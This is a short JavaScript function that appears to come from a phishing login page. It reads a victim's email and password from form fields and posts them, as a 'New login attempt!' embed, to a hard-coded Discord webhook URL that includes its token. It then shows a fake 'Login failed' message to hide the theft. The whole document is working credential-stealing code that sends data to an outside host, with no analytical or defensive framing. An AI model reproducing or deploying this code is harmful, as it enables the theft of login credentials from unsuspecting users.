function sendCredentials() {
 var username = document
  .getElementById("email")
  .value;
 var password = document
  .getElementById("password")
  .value;
 
 var payload = {
  "content": "New login attempt!",
  "embeds": [{
   "title": "Credentials",
   "fields": [{
     "name": "Username",
     "value": username
    },
    {
     "name": "Password",
     "value": password
    }
   ]
  }]
 };
 
 $.ajax({
  url: "https://discord.com/api/webhooks/1128462046250422343/J8ckfhqH1eZVA3e38CMaLoFIrwP-X_Q-NrWsyFwVszYVK-n4WnxgAeo6K6t5V_ktY_7g",
  type: "POST",
  data: JSON.stringify(
   payload),
  contentType: "application/json",
  success: function() {
   alert(
    "Login failed please check your network or try again later."
   );
  },
  error: function(xhr, status,
   error) {
   console.error(xhr
    .responseText);
   alert(
    "An error occurred with the login please try again."
   );
  }
 });
}
